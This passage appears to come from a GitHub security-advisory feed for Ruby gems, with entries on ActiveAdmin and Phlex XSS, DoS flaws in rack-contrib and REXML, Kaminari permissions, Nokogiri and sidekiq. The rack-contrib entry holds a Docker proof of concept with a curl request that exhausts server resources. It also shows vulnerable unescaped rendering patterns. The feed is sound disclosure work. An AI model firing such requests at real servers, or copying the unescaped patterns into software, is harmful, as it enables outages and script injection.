<p>Both <code>form</code> blocks with an implicit or explicit name (i.e., both <code>form resource.name</code> or <code>form name: resource.name</code> would suffer from the problem), where the value of the name can be arbitrarily set by non admin users.</p>
<h3 id="patches">Patches</h3>
<p>The problem has been fixed in ActiveAdmin 3.2.2 and ActiveAdmin 4.0.0.beta7.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Users can workaround this problem without upgrading by explicitly escaping the form name using an HTML escaping utility. For example:</p>
<pre><code class="language-ruby">  form do |f|
    f.inputs name: ERB::Util.html_escape(resource.name) do
      f.input :name
      f.input :description
    end

    f.actions
  end
</code></pre>
<p>Upgrading is of course recommended though.</p>
<h3 id="references">References</h3>
<p><a href="https://owasp.org/www-community/attacks/xss/#stored-xss-attacks">https://owasp.org/www-community/attacks/xss/#stored-xss-attacks</a></p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/activeadmin/activeadmin/security/advisories/GHSA-9mg6-x45v-hcfm">https://github.com/activeadmin/activeadmin/security/advisories/GHSA-9mg6-x45v-hcfm</a></li>
<li><a href="https://github.com/activeadmin/activeadmin/pull/8349">https://github.com/activeadmin/activeadmin/pull/8349</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-37031">https://nvd.nist.gov/vuln/detail/CVE-2024-37031</a></li>
<li><a href="https://github.com/activeadmin/activeadmin/releases/tag/v3.2.2">https://github.com/activeadmin/activeadmin/releases/tag/v3.2.2</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/activeadmin/CVE-2024-37031.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/activeadmin/CVE-2024-37031.yml</a></li>
<li><a href="https://rubygems.org/gems/activeadmin/versions/3.2.2">https://rubygems.org/gems/activeadmin/versions/3.2.2</a></li>
<li><a href="https://github.com/advisories/GHSA-9mg6-x45v-hcfm">https://github.com/advisories/GHSA-9mg6-x45v-hcfm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9mg6-x45v-hcfm</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-06-02T22:32:24.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[activeadmin] activeadmin vulnerable to stored persistent cross-site scripting (XSS) in dynamic form legends]]></title>
        <id>https://github.com/advisories/GHSA-9mg6-x45v-hcfm</id>
        <link href="https://github.com/advisories/GHSA-9mg6-x45v-hcfm"/>
        <updated>2024-06-04T02:44:58.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Users settings their active admin form legends dynamically may be vulnerable to stored XSS, as long as its value can be injected directly by a malicious user.</p>
<p>For example:</p>
<ul>
<li>A public web application allows users to create entities with arbitrary names.</li>
<li>Active Admin is used to administrate these entities through a private backend.</li>
<li>The form to edit these entities in the private backend has the following shape (note the dynamic <code>name</code> value dependent on an attribute of the <code>resource</code>):</li>
</ul>
<pre><code class="language-ruby">  form do |f|
    f.inputs name: resource.name do
      f.input :name
      f.input :description
    end

    f.actions
  end
</code></pre>
<p>Then a malicious user could create an entity with a payload that would get executed in the active admin administrator's browser.</p>
<p>Both <code>form</code> blocks with an implicit or explicit name (i.e., both <code>form resource.name</code> or <code>form name: resource.name</code> would suffer from the problem), where the value of the name can be arbitrarily set by non admin users.</p>
<h3 id="patches">Patches</h3>
<p>The problem has been fixed in ActiveAdmin 3.2.2 and ActiveAdmin 4.0.0.beta7.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Users can workaround this problem without upgrading by explicitly escaping the form name using an HTML escaping utility. For example:</p>
<pre><code class="language-ruby">  form do |f|
    f.inputs name: ERB::Util.html_escape(resource.name) do
      f.input :name
      f.input :description
    end

    f.actions
  end
</code></pre>
<p>Upgrading is of course recommended though.</p>
<h3 id="references">References</h3>
<p><a href="https://owasp.org/www-community/attacks/xss/#stored-xss-attacks">https://owasp.org/www-community/attacks/xss/#stored-xss-attacks</a></p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/activeadmin/activeadmin/security/advisories/GHSA-9mg6-x45v-hcfm">https://github.com/activeadmin/activeadmin/security/advisories/GHSA-9mg6-x45v-hcfm</a></li>
<li><a href="https://github.com/activeadmin/activeadmin/pull/8349">https://github.com/activeadmin/activeadmin/pull/8349</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-37031">https://nvd.nist.gov/vuln/detail/CVE-2024-37031</a></li>
<li><a href="https://github.com/activeadmin/activeadmin/releases/tag/v3.2.2">https://github.com/activeadmin/activeadmin/releases/tag/v3.2.2</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/activeadmin/CVE-2024-37031.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/activeadmin/CVE-2024-37031.yml</a></li>
<li><a href="https://rubygems.org/gems/activeadmin/versions/3.2.2">https://rubygems.org/gems/activeadmin/versions/3.2.2</a></li>
<li><a href="https://github.com/advisories/GHSA-9mg6-x45v-hcfm">https://github.com/advisories/GHSA-9mg6-x45v-hcfm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9mg6-x45v-hcfm</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-06-02T22:32:24.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[rack-contrib] rack-contrib vulnerable to Denial of Service due to the unconstrained value of the incoming "profiler_runs" parameter]]></title>
        <id>https://github.com/advisories/GHSA-8c8q-2xw3-j869</id>
        <link href="https://github.com/advisories/GHSA-8c8q-2xw3-j869"/>
        <updated>2024-05-31T20:42:29.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The next ruby code is vulnerable to denial of service due to the fact that the user controlled data <code>profiler_runs</code> was not contrained to any limitation. Which would lead to allocating resources on the server side with no limitation (CWE-770).</p>
<pre><code class="language-ruby">        runs = (request.params['profiler_runs'] || @times).to_i
        result = @profile.profile do
          runs.times { @app.call(env) }
        end
</code></pre>
<p>An exploit as such <code>curl --fail "http://127.0.0.1:9292/?profiler_runs=9999999999&amp;profile=process_time"</code> may cause resource exhaution by a remotely controlled value.</p>
<h3 id="poc">PoC</h3>
<p>Herein the <code>config.ru</code> file: </p>
<pre><code class="language-ruby">require 'rack'
require 'rack/contrib'

use Rack::Profiler # if ENV['RACK_ENV'] == 'development'

# Define a Rack application
app = lambda do |env|
  # Your application logic goes here
  [200, {}, ["Hello World"]]
end

# Run the Rack application
run app
</code></pre>
<p>A Dockerfile:</p>
<pre><code class="language-Dockerfile"># Use the official Ruby image as a base
FROM ruby:latest

# Set the working directory inside the container
WORKDIR /app

# Copy the custom config.ru file into the container
COPY config.ru .
COPY Gemfile .

# Install rack and the gems needed to run the app
RUN bundle install

# Expose the port that rackup will listen on
EXPOSE 9292

# Run rackup when the container starts
ENTRYPOINT ["rackup","--host","0.0.0.0","--port","9292"]

# Health check
HEALTHCHECK --interval=3s --timeout=10s --start-period=2s --retries=3 CMD curl --fail http://localhost:9292/ || exit 1
</code></pre>
<p>A Gemfile </p>
<pre><code>source 'https://rubygems.org'

gem 'rack', '~&gt; 2.0'
gem 'rack-contrib', '~&gt; 2.4'
gem 'rackup'
gem 'ruby-prof'
</code></pre>
<p>A Docker compose</p>
<pre><code class="language-Dockerfile">services:
  app:
    build:
      context: .
    ports:
      - "9292:9292"
</code></pre>
<p>To run the PoC </p>
<pre><code class="language-bash">docker compose up --build
</code></pre>
<p>To exploit DoS: </p>
<pre><code class="language-bash">curl  "http://127.0.0.1:9292/?profiler_runs=9999999999&amp;profile=process_time"
</code></pre>
<h3 id="impact">Impact</h3>
<ul>
<li>Potential denial of service by remotely user-controlled data.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/rack/rack-contrib/security/advisories/GHSA-8c8q-2xw3-j869">https://github.com/rack/rack-contrib/security/advisories/GHSA-8c8q-2xw3-j869</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-35231">https://nvd.nist.gov/vuln/detail/CVE-2024-35231</a></li>
<li><a href="https://github.com/rack/rack-contrib/commit/0eec2a9836329051c6742549e65a94a4c24fe6f7">https://github.com/rack/rack-contrib/commit/0eec2a9836329051c6742549e65a94a4c24fe6f7</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/rack-contrib/CVE-2024-35231.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/rack-contrib/CVE-2024-35231.yml</a></li>
<li><a href="https://github.com/advisories/GHSA-8c8q-2xw3-j869">https://github.com/advisories/GHSA-8c8q-2xw3-j869</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8c8q-2xw3-j869</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-05-28T15:48:43.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[kaminari] Kaminari Insecure File Permissions Vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-7r3j-qmr4-jfpj</id>
        <link href="https://github.com/advisories/GHSA-7r3j-qmr4-jfpj"/>
        <updated>2024-05-31T20:33:46.000Z</updated>
        <content type="html"><![CDATA[<p>A moderate severity security vulnerability has been identified in the Kaminari pagination library for Ruby on Rails, concerning insecure file permissions. This advisory outlines the vulnerability, affected versions, and provides guidance for mitigation.</p>
<h3 id="impact">Impact</h3>
<p>This vulnerability is of moderate severity due to the potential for unauthorized write access to particular Ruby files managed by the library. Such access could lead to the alteration of application behavior or data integrity issues.</p>
<h3 id="resolution">Resolution</h3>
<p>Those who use the <code>gem install</code> command, such as <code>gem install kaminari -v 0.16.1</code>, <code>gem unpack kaminari -v 0.16.1</code>, or <code>bundle install</code> to download the package would <strong><em>not</em></strong> be affected and no action is required. </p>
<p>Those who manually download and decompressing the affected versions are advised to update to 0.16.2 or later version of Kaminari where file permissions have been adjusted to enhance security.</p>
<h3 id="workarounds">Workarounds</h3>
<p>If upgrading is not feasible immediately, manually adjusting the file permissions on the server to <code>644</code> to restrict access is a viable interim measure.</p>
<h4 id="all-affected-versions">All Affected Versions:</h4>
<pre><code>lib/kaminari/models/page_scope_methods.rb
</code></pre>
<p>In addition to the previously mentioned files, security tools like AWS Inspector might also identify other files as unsafe. These files, although not loaded or used at runtime, may still be flagged. To avoid any potential confusion in your logs and ensure system integrity, we recommend updating the permissions for these files as well. This proactive measure helps maintain a clean security posture and minimizes unnecessary alerts.</p>
<h4 id="version-0150-and-0151">Version 0.15.0 and 0.15.1:</h4>
<pre><code>spec/models/mongo_mapper/mongo_mapper_spec.rb
</code></pre>
<h4 id="version-0160">Version 0.16.0:</h4>
<pre><code>spec/models/mongo_mapper/mongo_mapper_spec.rb
spec/models/mongoid/mongoid_spec.rb
</code></pre>
<h4 id="version-0161">Version 0.16.1:</h4>
<pre><code>spec/models/active_record/scopes_spec.rb
spec/models/mongo_mapper/mongo_mapper_spec.rb
spec/models/mongoid/mongoid_spec.rb
gemfiles/data_mapper_12.gemfile
gemfiles/active_record_32.gemfile
</code></pre>
<h3 id="references">References</h3>
<p>Official Kaminari repository link (this page)</p>
<h3 id="acknowledgements">Acknowledgements</h3>
<p>We thank <a href="https://github.com/G-Rath">Gareth Jones</a> for discovering and reporting this issue. Their diligent work is instrumental in our ongoing efforts to maintain and improve software security.</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/kaminari/kaminari/security/advisories/GHSA-7r3j-qmr4-jfpj">https://github.com/kaminari/kaminari/security/advisories/GHSA-7r3j-qmr4-jfpj</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-32978">https://nvd.nist.gov/vuln/detail/CVE-2024-32978</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/kaminari/CVE-2024-32978.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/kaminari/CVE-2024-32978.yml</a></li>
<li><a href="https://github.com/advisories/GHSA-7r3j-qmr4-jfpj">https://github.com/advisories/GHSA-7r3j-qmr4-jfpj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7r3j-qmr4-jfpj</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-05-28T15:47:00.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[rexml] REXML contains a denial of service vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-vg3r-rm7w-2xgh</id>
        <link href="https://github.com/advisories/GHSA-vg3r-rm7w-2xgh"/>
        <updated>2024-05-16T19:05:52.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The REXML gem before 3.2.6 has a DoS vulnerability when it parses an XML that has many <code>&lt;</code>s in an attribute value.</p>
<p>If you need to parse untrusted XMLs, you many be impacted to this vulnerability.</p>
<h3 id="patches">Patches</h3>
<p>The REXML gem 3.2.7 or later include the patch to fix this vulnerability.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Don't parse untrusted XMLs.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://www.ruby-lang.org/en/news/2024/05/16/dos-rexml-cve-2024-35176/">https://www.ruby-lang.org/en/news/2024/05/16/dos-rexml-cve-2024-35176/</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/ruby/rexml/security/advisories/GHSA-vg3r-rm7w-2xgh">https://github.com/ruby/rexml/security/advisories/GHSA-vg3r-rm7w-2xgh</a></li>
<li><a href="https://github.com/ruby/rexml/commit/4325835f92f3f142ebd91a3fdba4e1f1ab7f1cfb">https://github.com/ruby/rexml/commit/4325835f92f3f142ebd91a3fdba4e1f1ab7f1cfb</a></li>
<li><a href="https://www.ruby-lang.org/en/news/2024/05/16/dos-rexml-cve-2024-35176">https://www.ruby-lang.org/en/news/2024/05/16/dos-rexml-cve-2024-35176</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-35176">https://nvd.nist.gov/vuln/detail/CVE-2024-35176</a></li>
<li><a href="https://github.com/advisories/GHSA-vg3r-rm7w-2xgh">https://github.com/advisories/GHSA-vg3r-rm7w-2xgh</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vg3r-rm7w-2xgh</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-05-16T17:44:04.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[nokogiri] Duplicate Advisory: Nokogiri updates packaged libxml2 to v2.12.7 to resolve CVE-2024-34459]]></title>
        <id>https://github.com/advisories/GHSA-r3w4-36x6-7r99</id>
        <link href="https://github.com/advisories/GHSA-r3w4-36x6-7r99"/>
        <updated>2024-05-16T17:53:38.000Z</updated>
        <content type="html"><![CDATA[<h2 id="duplicate-advisory">Duplicate Advisory</h2>
<p>This advisory has been withdrawn because it is a duplicate of GHSA-r95h-9x8f-r3f7. This link is maintained to preserve external references.</p>
<h2 id="original-description">Original Description</h2>
<h2 id="summary">Summary</h2>
<p>Nokogiri v1.16.5 upgrades its dependency libxml2 to
<a href="https://gitlab.gnome.org/GNOME/libxml2/-/releases/v2.12.7">2.12.7</a> from 2.12.6.</p>
<p>libxml2 v2.12.7 addresses CVE-2024-34459:</p>
<ul>
<li>described at <a href="https://gitlab.gnome.org/GNOME/libxml2/-/issues/720">https://gitlab.gnome.org/GNOME/libxml2/-/issues/720</a></li>
<li>patched by <a href="https://gitlab.gnome.org/GNOME/libxml2/-/commit/2876ac53">https://gitlab.gnome.org/GNOME/libxml2/-/commit/2876ac53</a></li>
</ul>
<h2 id="impact">Impact</h2>
<p>There is no impact to Nokogiri users because the issue is present only
in libxml2's <code>xmllint</code> tool which Nokogiri does not provide or expose.</p>
<h2 id="timeline">Timeline</h2>
<ul>
<li>2024-05-13 05:57 EDT, libxml2 2.12.7 release is announced</li>
<li>2024-05-13 08:30 EDT, nokogiri maintainers begin triage</li>
<li>2024-05-13 10:05 EDT, nokogiri <a href="https://github.com/sparklemotion/nokogiri/releases/tag/v1.16.5">v1.16.5 is released</a>
and this GHSA made public</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/sparklemotion/nokogiri/security/advisories/GHSA-r95h-9x8f-r3f7">https://github.com/sparklemotion/nokogiri/security/advisories/GHSA-r95h-9x8f-r3f7</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/nokogiri/GHSA-r95h-9x8f-r3f7.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/nokogiri/GHSA-r95h-9x8f-r3f7.yml</a></li>
<li><a href="https://gitlab.gnome.org/GNOME/libxml2/-/issues/720">https://gitlab.gnome.org/GNOME/libxml2/-/issues/720</a></li>
<li><a href="https://github.com/advisories/GHSA-r3w4-36x6-7r99">https://github.com/advisories/GHSA-r3w4-36x6-7r99</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-r3w4-36x6-7r99</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2024-05-14T22:30:45.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[nokogiri] Nokogiri updates packaged libxml2 to v2.12.7 to resolve CVE-2024-34459]]></title>
        <id>https://github.com/advisories/GHSA-r95h-9x8f-r3f7</id>
        <link href="https://github.com/advisories/GHSA-r95h-9x8f-r3f7"/>
        <updated>2024-05-16T17:45:01.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>Nokogiri v1.16.5 upgrades its dependency libxml2 to <a href="https://gitlab.gnome.org/GNOME/libxml2/-/releases/v2.12.7">2.12.7</a> from 2.12.6.</p>
<p>libxml2 v2.12.7 addresses CVE-2024-34459:</p>
<ul>
<li>described at <a href="https://gitlab.gnome.org/GNOME/libxml2/-/issues/720">https://gitlab.gnome.org/GNOME/libxml2/-/issues/720</a></li>
<li>patched by <a href="https://gitlab.gnome.org/GNOME/libxml2/-/commit/2876ac53">https://gitlab.gnome.org/GNOME/libxml2/-/commit/2876ac53</a></li>
</ul>
<h2 id="impact">Impact</h2>
<p>There is no impact to Nokogiri users because the issue is present only in libxml2's <code>xmllint</code> tool which Nokogiri does not provide or expose.</p>
<h2 id="timeline">Timeline</h2>
<ul>
<li>2024-05-13 05:57 EDT, libxml2 2.12.7 release is announced</li>
<li>2024-05-13 08:30 EDT, nokogiri maintainers begin triage</li>
<li>2024-05-13 10:05 EDT, nokogiri <a href="https://github.com/sparklemotion/nokogiri/releases/tag/v1.16.5">v1.16.5 is released</a> and this GHSA made public</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/sparklemotion/nokogiri/security/advisories/GHSA-r95h-9x8f-r3f7">https://github.com/sparklemotion/nokogiri/security/advisories/GHSA-r95h-9x8f-r3f7</a></li>
<li><a href="https://github.com/sparklemotion/nokogiri/releases/tag/v1.16.5">https://github.com/sparklemotion/nokogiri/releases/tag/v1.16.5</a></li>
<li><a href="https://gitlab.gnome.org/GNOME/libxml2/-/commit/2876ac53">https://gitlab.gnome.org/GNOME/libxml2/-/commit/2876ac53</a></li>
<li><a href="https://gitlab.gnome.org/GNOME/libxml2/-/issues/720">https://gitlab.gnome.org/GNOME/libxml2/-/issues/720</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/nokogiri/GHSA-r95h-9x8f-r3f7.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/nokogiri/GHSA-r95h-9x8f-r3f7.yml</a></li>
<li><a href="https://github.com/advisories/GHSA-r95h-9x8f-r3f7">https://github.com/advisories/GHSA-r95h-9x8f-r3f7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-r95h-9x8f-r3f7</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2024-05-13T16:05:42.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[phlex] Phlex vulnerable to Cross-site Scripting (XSS) via maliciously formed HTML attribute names and values]]></title>
        <id>https://github.com/advisories/GHSA-9p57-h987-4vgx</id>
        <link href="https://github.com/advisories/GHSA-9p57-h987-4vgx"/>
        <updated>2024-05-03T20:17:03.000Z</updated>
        <content type="html"><![CDATA[<p>There is a potential cross-site scripting (XSS) vulnerability that can be exploited via maliciously crafted user data.</p>
<p>The reason these issues were not detected before is the escapes were working as designed. However, their design didn't take into account just how recklessly permissive browser are when it comes to executing unsafe JavaScript via HTML attributes.</p>
<h3 id="impact">Impact</h3>
<p>If you render an <code>&lt;a&gt;</code> tag with an <code>href</code> attribute set to a user-provided link, that link could potentially execute JavaScript when clicked by another user.</p>
<pre><code class="language-ruby">a(href: user_profile) { "Profile" }
</code></pre>
<p>If you splat user-provided attributes when rendering any HTML or SVG tag, malicious event attributes could be included in the output, executing JavaScript when the events are triggered by another user.</p>
<pre><code class="language-ruby">h1(**JSON.parse(user_attributes))
</code></pre>
<h3 id="patches">Patches</h3>
<p>Patches are <a href="https://rubygems.org/gems/phlex">available on RubyGems</a> for all minor versions released in the last year.</p>
<ul>
<li><a href="https://rubygems.org/gems/phlex/versions/1.10.2">1.10.2</a></li>
<li><a href="https://rubygems.org/gems/phlex/versions/1.9.3">1.9.3</a></li>
</ul>
<p>If you are on <code>main</code>, it has been patched since <a href="https://github.com/phlex-ruby/phlex/commit/da8f94342a84cff9d78c98bcc3b3604ee2e577d2"><code>da8f943</code></a></p>
<h3 id="workarounds">Workarounds</h3>
<p>Configuring a <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy">Content Security Policy</a> that does not allow <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy#unsafe-inline"><code>unsafe-inline</code></a> would effectively prevent this vulnerability from being exploited.</p>
<h3 id="references">References</h3>
<p>In addition to upgrading to a patched version of Phlex, we strongly recommend configuring a Content Security Policy header that does not allow <code>unsafe-inline</code>. Here’s how you can configure a Content Security Policy header in Rails. <a href="https://guides.rubyonrails.org/security.html#content-security-policy-header">https://guides.rubyonrails.org/security.html#content-security-policy-header</a></p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/phlex-ruby/phlex/security/advisories/GHSA-9p57-h987-4vgx">https://github.com/phlex-ruby/phlex/security/advisories/GHSA-9p57-h987-4vgx</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-32970">https://nvd.nist.gov/vuln/detail/CVE-2024-32970</a></li>
<li><a href="https://github.com/phlex-ruby/phlex/commit/da8f94342a84cff9d78c98bcc3b3604ee2e577d2">https://github.com/phlex-ruby/phlex/commit/da8f94342a84cff9d78c98bcc3b3604ee2e577d2</a></li>
<li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy">https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy</a></li>
<li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy#unsafe-inline">https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy#unsafe-inline</a></li>
<li><a href="https://github.com/payloadbox/xss-payload-list">https://github.com/payloadbox/xss-payload-list</a></li>
<li><a href="https://rubygems.org/gems/phlex">https://rubygems.org/gems/phlex</a></li>
<li><a href="https://rubygems.org/gems/phlex/versions/1.10.2">https://rubygems.org/gems/phlex/versions/1.10.2</a></li>
<li><a href="https://rubygems.org/gems/phlex/versions/1.9.3">https://rubygems.org/gems/phlex/versions/1.9.3</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/phlex/CVE-2024-32970.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/phlex/CVE-2024-32970.yml</a></li>
<li><a href="https://github.com/advisories/GHSA-9p57-h987-4vgx">https://github.com/advisories/GHSA-9p57-h987-4vgx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9p57-h987-4vgx</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-05-01T16:37:21.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[phlex] Phlex vulnerable to Cross-site Scripting (XSS) via maliciously formed HTML attribute names and values]]></title>
        <id>https://github.com/advisories/GHSA-9p57-h987-4vgx</id>
        <link href="https://github.com/advisories/GHSA-9p57-h987-4vgx"/>
        <updated>2024-05-03T20:17:03.000Z</updated>
        <content type="html"><![CDATA[<p>There is a potential cross-site scripting (XSS) vulnerability that can be exploited via maliciously crafted user data.</p>
<p>The reason these issues were not detected before is the escapes were working as designed. However, their design didn't take into account just how recklessly permissive browser are when it comes to executing unsafe JavaScript via HTML attributes.</p>
<h3 id="impact">Impact</h3>
<p>If you render an <code>&lt;a&gt;</code> tag with an <code>href</code> attribute set to a user-provided link, that link could potentially execute JavaScript when clicked by another user.</p>
<pre><code class="language-ruby">a(href: user_profile) { "Profile" }
</code></pre>
<p>If you splat user-provided attributes when rendering any HTML or SVG tag, malicious event attributes could be included in the output, executing JavaScript when the events are triggered by another user.</p>
<pre><code class="language-ruby">h1(**JSON.parse(user_attributes))
</code></pre>
<h3 id="patches">Patches</h3>
<p>Patches are <a href="https://rubygems.org/gems/phlex">available on RubyGems</a> for all minor versions released in the last year.</p>
<ul>
<li><a href="https://rubygems.org/gems/phlex/versions/1.10.2">1.10.2</a></li>
<li><a href="https://rubygems.org/gems/phlex/versions/1.9.3">1.9.3</a></li>
</ul>
<p>If you are on <code>main</code>, it has been patched since <a href="https://github.com/phlex-ruby/phlex/commit/da8f94342a84cff9d78c98bcc3b3604ee2e577d2"><code>da8f943</code></a></p>
<h3 id="workarounds">Workarounds</h3>
<p>Configuring a <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy">Content Security Policy</a> that does not allow <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy#unsafe-inline"><code>unsafe-inline</code></a> would effectively prevent this vulnerability from being exploited.</p>
<h3 id="references">References</h3>
<p>In addition to upgrading to a patched version of Phlex, we strongly recommend configuring a Content Security Policy header that does not allow <code>unsafe-inline</code>. Here’s how you can configure a Content Security Policy header in Rails. <a href="https://guides.rubyonrails.org/security.html#content-security-policy-header">https://guides.rubyonrails.org/security.html#content-security-policy-header</a></p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/phlex-ruby/phlex/security/advisories/GHSA-9p57-h987-4vgx">https://github.com/phlex-ruby/phlex/security/advisories/GHSA-9p57-h987-4vgx</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-32970">https://nvd.nist.gov/vuln/detail/CVE-2024-32970</a></li>
<li><a href="https://github.com/phlex-ruby/phlex/commit/da8f94342a84cff9d78c98bcc3b3604ee2e577d2">https://github.com/phlex-ruby/phlex/commit/da8f94342a84cff9d78c98bcc3b3604ee2e577d2</a></li>
<li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy">https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy</a></li>
<li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy#unsafe-inline">https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy#unsafe-inline</a></li>
<li><a href="https://github.com/payloadbox/xss-payload-list">https://github.com/payloadbox/xss-payload-list</a></li>
<li><a href="https://rubygems.org/gems/phlex">https://rubygems.org/gems/phlex</a></li>
<li><a href="https://rubygems.org/gems/phlex/versions/1.10.2">https://rubygems.org/gems/phlex/versions/1.10.2</a></li>
<li><a href="https://rubygems.org/gems/phlex/versions/1.9.3">https://rubygems.org/gems/phlex/versions/1.9.3</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/phlex/CVE-2024-32970.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/phlex/CVE-2024-32970.yml</a></li>
<li><a href="https://github.com/advisories/GHSA-9p57-h987-4vgx">https://github.com/advisories/GHSA-9p57-h987-4vgx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9p57-h987-4vgx</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-05-01T16:37:21.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[sidekiq] sidekiq vulnerable to cross-site scripting ]]></title>
        <id>https://github.com/advisories/GHSA-h3r8-h5qw-4r35</id>
        <link href="https://github.com/advisories/GHSA-h3r8-h5qw-4r35"/>
        <updated>2024-05-01T13:15:10.000Z</updated>
        <content type="html"><![CDATA[<p>sidekiq from 7.0.4 to 7.0.7 is vulnerable to reflected cross-site scripting. A fix was released in version 7.0.8.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-1892">https://nvd.nist.gov/vuln/detail/CVE-2023-1892</a></li>
<li><a href="https://github.com/sidekiq/sidekiq/commit/458fdf74176a9881478c48dc5cf0269107b22214">https://github.com/sidekiq/sidekiq/commit/458fdf74176a9881478c48dc5cf0269107b22214</a></li>
<li><a href="https://huntr.dev/bounties/e35e5653-c429-4fb8-94a3-cbc123ae4777">https://huntr.dev/bounties/e35e5653-c429-4fb8-94a3-cbc123ae4777</a></li>
